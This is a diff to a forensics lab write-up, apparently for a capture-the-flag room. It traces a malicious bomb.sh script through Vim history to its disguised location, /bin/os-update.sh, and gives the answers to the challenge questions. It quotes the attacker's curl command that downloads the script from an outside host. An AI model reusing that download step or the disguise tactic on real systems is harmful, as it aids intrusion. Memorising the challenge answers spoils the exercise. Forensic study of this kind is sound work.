@@ -140,3 +140,22 @@ Since the `bomb.sh` file was no longer present on the file system, I investigate
 
 #### Answer
 curl 10.10.158.38:8080/bomb.sh --output bomb.sh
+
+### 7. The file was renamed and moved to a different directory. What is the full path of this file now?
+
+#### Method
+Since the file `bomb.sh` was deleted from the initial location, I investigated whether it had been moved or renamed before removal. 
+1. Following the lead that the file was opened with `vi`, I checked the `.viminfo` file in the `/home/it-admin` directory.
+2. The `.viminfo` file stores command-line history and actions performed within the Vim editor.
+3. I discovered a `saveas` command in the history: `saveas /bin/os-update.sh`.
+4. This confirms the attacker attempted to disguise the malicious script as a legitimate system update utility by moving it to a critical system directory (`/bin/`).
+
+**Command used to inspect Vim history:**
+`cat /home/it-admin/.viminfo`
+
+**Screenshot:**
+<img width="636" height="867" alt="image" src="https://github.com/user-attachments/assets/981ee835-c1e6-40e4-8a9e-cb7703b96cb9" />
+
+
+#### Answer
+/bin/os-update.sh
